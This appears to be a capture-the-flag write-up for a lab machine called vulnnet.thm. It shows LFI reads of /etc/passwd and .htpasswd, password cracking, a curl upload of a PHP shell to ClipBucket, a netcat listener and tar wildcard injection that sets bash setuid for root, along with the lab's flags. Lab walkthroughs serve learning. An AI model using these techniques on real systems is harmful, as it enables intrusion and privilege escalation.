**Initial Reconnaissance**

Added domain to `/etc/hosts`:
```
10.67.148.153    vulnnet.thm 
```

**Nmap Scan**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

**Web Enumeration with Gobuster**
```
/index.php            (Status: 200)
/login.html           (Status: 200)
/img                  (Status: 301)
/css                  (Status: 301)
/js                   (Status: 301)
/LICENSE.txt          (Status: 200)
```

**JS Analysis**  
Found two interesting links:
```
"http://vulnnet.thm/index.php?referer="
"http://broadcast.vulnnet.thm"
```

**LFI in index.php**
```
http://vulnnet.thm/index.php?referer=/etc/passwd
```
Found users: `root` and `server-management`

**Finding Credentials**
```
http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd

developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

**Cracking with John**

```
developers:9972761drmfsls
```

**Accessing ClipBucket**  
```
Credentials work on `http://broadcast.vulnnet.thm`  
Version: ClipBucket 4.0
```
![[Pasted image 20260314183105.png]]

**Exploiting ClipBucket

looking on searchsploit
![[Pasted image 20260314183517.png]]
```
curl -u developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```
Got filename: `17734719245571d8`

**Reverse Shell**

```
nc -lvnp 4444
```
 
```
www-data@vulnnet:/var/www/html/api$
```

**Internal Enumeration**
Got server-management's id_rsa
```
cp /var/backups/ssh-backup.tar.gz /tmp/
tar -xzvf ssh-backup.tar.gz
```

**Cracking SSH Key**

cracking the password with john
```
john id_rsa.key
Password: oneTWO3gOyac
```
 
**SSH Access**
```bash

ssh -i id_rsa server-management@broadcast.vulnnet.thm
server-management@vulnnet:~$ cat user.txt
THM{907e420d979d8e2992f3d7e16bee1e8b}
```
**Privilege Escalation**  

Found root cronjob:
```
*/2 * * * * root /var/opt/backupsrv.sh

```

The script uses tar * in /home/server-management/Documents → wildcard vulnerability
```
www-data@vulnnet:/var/www/html/api$ cat /var/opt/backupsrv.sh      
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest

```

**Exploitation**
 wild card * vulnerability
```
cd /home/server-management/Documents
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/bash' > shell.sh
echo 'chmod +s /bin/bash' >> shell.sh
chmod +x shell.sh
```

**Root**
```
/bin/bash -p
bash-4.4# cat /root/root.txt
THM{220b671dd8adc301b34c2738ee8295ba}
```